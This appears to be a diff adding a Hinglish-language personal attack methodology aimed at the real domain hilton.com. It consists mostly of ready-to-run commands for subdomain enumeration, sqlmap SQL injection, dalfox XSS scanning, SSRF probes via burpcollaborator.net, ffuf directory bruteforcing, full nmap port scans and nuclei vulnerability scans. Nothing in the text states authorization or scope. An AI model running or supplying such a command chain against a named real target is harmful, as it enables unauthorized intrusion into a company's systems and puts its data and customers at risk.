@@ -1,0 +1,138 @@
+My methology
+
+Hilton.com par aur attacks try karte hain step-by-step:
+
+1. SUBDOMAIN ENUMERATION (Sabse Important)
+
+```bash
+# Subfinder se
+subfinder -d hilton.com -o subdomains.txt
+
+# Assetfinder se  
+assetfinder --subs-only hilton.com >> subdomains.txt
+
+# Amass se
+amass enum -passive -d hilton.com -o amass_subs.txt
+
+# Sort and unique
+cat subdomains.txt amass_subs.txt | sort -u > all_subs.txt
+```
+
+2. LIVE SUBDOMAINS CHECK
+
+```bash
+cat all_subs.txt | httpx -silent -mc 200,301,302,403 -o live_subs.txt
+```
+
+3. URL DISCOVERY (Parameters Ke Saath)
+
+```bash
+# Wayback machine se
+cat live_subs.txt | waybackurls > urls.txt
+
+# Gau se
+cat live_subs.txt | gau >> urls.txt
+
+# Katana se crawling
+katana -u live_subs.txt -o katana_urls.txt
+```
+
+4. VULNERABILITY SCANNING
+
+A. SQL Injection Test
+
+```bash
+# SQLi parameters dhundho
+cat urls.txt | gf sqli > sqli_urls.txt
+
+# SQLmap se test karo
+sqlmap -m sqli_urls.txt --batch --level 3 --risk 2
+```
+
+B. XSS Test
+
+```bash
+# XSS parameters dhundho
+cat urls.txt | gf xss > xss_urls.txt
+
+# Dalfox se test karo
+cat xss_urls.txt | dalfox pipe --silent
+```
+
+C. SSRF Test
+
+```bash
+# SSRF parameters dhundho
+cat urls.txt | gf ssrf > ssrf_urls.txt
+
+# Qsreplace se test karo
+cat ssrf_urls.txt | qsreplace "http://burpcollaborator.net" | httpx -silent
+```
+
+5. DIRECTORY BRUTEFORCE
+
+```bash
+# FFUF se
+ffuf -u "https://hilton.com/FUZZ" -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -o dirs.txt
+
+# Important directories ke liye
+ffuf -u "https://hilton.com/FUZZ" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -mc all -o detailed_dirs.txt
+```
+
+6. TECHNOLOGY DETECTION
+
+```bash
+# WhatWeb se
+whatweb hilton.com
+
+# Wappalyzer CLI se
+wappalyzer hilton.com
+```
+
+7. PORT SCANNING (Detailed)
+
+```bash
+# Full port scan
+nmap -sV -sC -p- hilton.com -oA full_scan
+
+# Specific web ports
+nmap -sV -sC -p 80,443,8080,8443,3000,5000,7000,8000,9000 hilton.com
+```
+
+8. HEADER ANALYSIS
+
+```bash
+# Security headers check karo
+curl -I https://hilton.com
+
+# Detailed header analysis
+nuclei -u https://hilton.com -t http/security-misconfiguration/
+```
+
+9. NUCLEI TEMPLATES
+
+```bash
+# Common vulnerabilities ke liye
+nuclei -l live_subs.txt -t /root/nuclei-templates/ -o nuclei_results.txt
+
+# Specific templates se
+nuclei -l live_subs.txt -t /root/nuclei-templates/exposures/ -o exposures.txt
+nuclei -l live_subs.txt -t /root/nuclei-templates/misconfiguration/ -o misconfig.txt
+```
+
+10. JAVASCRIPT ANALYSIS
+
+```bash
+# JS files se endpoints extract karo
+cat urls.txt | grep "\.js$" | httpx -silent | while read url; do
+    curl -s $url | grep -E "api|endpoint|url|path" | tee js_endpoints.txt
+done
+```
+
+Priority Order:
+
+1. Subdomain Enumeration
+2. URL Discovery with Parameters
+3. SQL Injection & XSS Testing
+4. Directory Bruteforce
+5. Nuclei Automated Scanning
